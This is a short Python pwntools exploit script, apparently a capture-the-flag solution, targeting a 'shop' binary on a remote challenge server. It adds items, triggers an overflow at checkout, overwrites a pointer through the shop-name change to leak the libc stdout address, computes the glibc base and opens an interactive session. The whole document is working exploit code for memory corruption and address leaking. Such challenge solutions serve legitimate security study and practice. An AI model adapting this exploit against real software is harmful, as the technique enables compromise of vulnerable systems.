#!/usr/bin/env python

from pwn import *

def checkout():
    p.sendline('c')
    p.sendline(cyclic(0x10000, alphabet='0123456789abcdef', n=4))

def get_shop_name(name):
    p.recvuntil('Enter your shop name:')
    p.sendline(name)
    p.recvuntil('> ')

def change_shop_name(name):
    p.sendline('n')
    get_shop_name(name)

def print_items():
    p.sendline('l')
    data = p.recvuntil('> ')
    return u64(data.split('\n')[-2].split(': $')[0] + '\00\00')

def add_item(name1, name2, price):
    p.sendline('a')
    p.sendline(name1)
    p.sendline(name2)
    p.sendline(str(price))

p = remote('shop.chal.pwning.xxx', 9916)
#p = process('./shop')

get_shop_name('aaaaaaaa')

for i in range(33):
    add_item(str(i), str(i), 10)

checkout()

change_shop_name(p64(0x6020b4) + '\00' * 4 + 'x' * 290)

stdout_addr = print_items()
print 'stdout address: {}'.format(hex(stdout_addr))

libc_base = stdout_addr - 0x3c5620
print 'glibc base: {}'.format(hex(libc_base))

p.interactive()

